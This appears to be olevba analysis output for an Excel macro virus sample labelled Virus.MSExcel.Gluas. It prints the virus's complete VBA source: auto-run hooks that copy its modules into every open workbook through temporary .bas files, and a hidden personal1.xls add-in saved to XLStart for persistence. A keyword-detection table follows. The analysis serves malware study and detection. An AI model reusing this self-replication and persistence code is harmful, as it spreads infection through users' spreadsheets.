olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Gluas-de5747b04a76677f10b18f730996dac909d6a065
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Gluas-de5747b04a76677f10b18f730996dac909d6a065 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Gluas-de5747b04a76677f10b18f730996dac909d6a065 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Gluas-de5747b04a76677f10b18f730996dac909d6a065 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Gluas-de5747b04a76677f10b18f730996dac909d6a065 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO code1.bas 
in file: Virus.MSExcel.Gluas-de5747b04a76677f10b18f730996dac909d6a065 - OLE stream: '_VBA_PROJECT_CUR/VBA/code1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim X As New code

Sub Auto_Open()
    Set X.App = Application
If ThisWorkbook.Name = "personal1.xls" Then
If Windows.Count = "1" Then
ActiveWindow.Visible = False
End If
Workbooks.Add
End If
End Sub
 
 


Sub algus()
If ThisWorkbook.Name = "personal1.xls" Then rot = "1" Else rot = "0"
o = "0"
For Each k In Workbooks
If k.Name = "personal1.xls" Then
o = "1"
End If
Next k
If o = 0 Then
If rot = "1" Then GoTo t鋓sk鋓k
Workbooks.Add
ad = ActiveWorkbook.Name
If ad = "funces.xla" Then GoTo l鮬p
ThisWorkbook.VBProject.VBComponents("code").Export ("c:\1.bas")
ThisWorkbook.VBProject.VBComponents("code1").Export ("c:\2.bas")
Workbooks(ad).VBProject.VBComponents.Import ("c:\1.bas")
Workbooks(ad).VBProject.VBComponents.Import ("c:\2.bas")
Kill ("C:\1.bas")
Kill ("C:\2.bas")
Workbooks(ad).SaveAs FileName:="C:\Program Files\Microsoft Office\Office\XLStart\personal1.xls", FileFormat:=xlAddIn _
, ConflictResolution:=xlLocalSessionChanges
ActiveWindow.Visible = False
GoTo l鮬p
End If
t鋓sk鋓k:
a = Workbooks.Count
For c = 1 To a                                      'c on workbooki nr
e = 0
For Each d In Workbooks(c).VBProject.VBComponents   'module nimi
f = Workbooks(c).Name                        'f on konr nimi
If d.Name = "code" Then
e = 1                              'e inf v鮥 ei
Else
End If
Next d
If e = 1 Then
Else
ThisWorkbook.VBProject.VBComponents("code").Export ("c:\1.bas")
ThisWorkbook.VBProject.VBComponents("code1").Export ("c:\2.bas")
Workbooks(f).VBProject.VBComponents.Import ("c:\1.bas")
Workbooks(f).VBProject.VBComponents.Import ("c:\2.bas")
Kill ("C:\1.bas")
Kill ("C:\2.bas")
End If
Next c
l鮬p:
mtime = Date
If Month(mtime) = "11" And Day(mtime) = "17" Then
MsgBox ("Tere t鋘a on kellegil hea p鋏v")
End If
End Sub

Sub Auto_Close()
If ThisWorkbook.Name = "personal1.xls" Then
ThisWorkbook.Close SaveChanges:=False
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO code.cls 
in file: Virus.MSExcel.Gluas-de5747b04a76677f10b18f730996dac909d6a065 - OLE stream: '_VBA_PROJECT_CUR/VBA/code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Public WithEvents App As Application
Attribute App.VB_VarHelpID = -1




Sub InitializeApp()
    Set X.App = Application
End Sub


Private Sub App_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
code1.algus
End Sub

Private Sub App_WorkbookOpen(ByVal Wb As Excel.Workbook)
code1.algus
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

